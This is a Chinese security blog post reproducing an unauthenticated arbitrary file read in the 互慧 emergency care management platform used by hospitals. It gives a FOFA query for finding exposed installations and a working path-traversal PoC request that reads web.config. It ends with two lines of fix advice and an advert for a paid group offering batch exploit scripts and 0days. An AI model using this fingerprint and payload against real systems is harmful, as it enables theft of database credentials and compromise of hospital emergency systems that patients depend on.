#  「漏洞复现」互慧-急诊综合管理平台 ServicePage.aspx 任意文件读取漏洞   
冷漠安全  冷漠安全   2025-01-03 03:08  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qRzaH5GUoT3wjfxgNKKQaVgq5UdQuTjibZ7l0YMRTIbMrfABFictia4ZEXKWAic1RbHRib9CiajtbcKQcw/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
互慧急诊急救快速联动平台，是用于管理门诊急诊病人的系统，主要包括门诊急诊业务和急诊物资管理两部分，其中门诊急诊业务主要包括院前急救、院内抢救、留观监护、绿色通道、预检分诊等；急诊物资管理包括急诊药品管理、急诊设备管理、抢救车管理、急救箱管理、急诊物资使用操作等与患者抢救相关的物资物品，目的在于通过门急诊管理系统缩短抢救患者流程，规范抢救措施，确保急诊物资使用安全，从而最终达到提高抢救成功率，确保患者的生命安全。  
  
0x03  
  
漏洞威胁  
  
互慧-急诊综合管理平台 ServicePage.aspx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
body="/emis_lib/js/ThreeExtras.js"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ovnUS8z2cARKWGA8vib8biaeibCtNOpbeYR9IpGliagc3v6hBXVjDoCF7Yicicopmibc7naK6ssX1Yf1XHw/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
GET /dcwriter/thirdpart/ServicePage.aspx?wasmres=./../web.config HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ovnUS8z2cARKWGA8vib8biaeIZEdrRHOe2QTGc97dBAUSqFy43IDXO8Lkrw9FTu0DFPLL07WI3bbDQ/640?wx_fmt=png&from=appmsg "")  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ovnUS8z2cARKWGA8vib8biae2169PybPicP3Y98lJIRxcpO8QFVrzsgWc0bRS8wDjPckQJ2Wd6DOIeQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ovnUS8z2cARKWGA8vib8biaeudAIicHMUnBoJB8BBcqRe7Ugicgl1nbib25e9BBYgoKuq1nxMoicNYIqibw/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0ovnUS8z2cARKWGA8vib8biae3E9xeQQxOPymZ7bK2DcBUqAvJHXb7FRRrcLzA4enFwB7j70OooUhfA/640?wx_fmt=gif&from=appmsg "")  
  
  
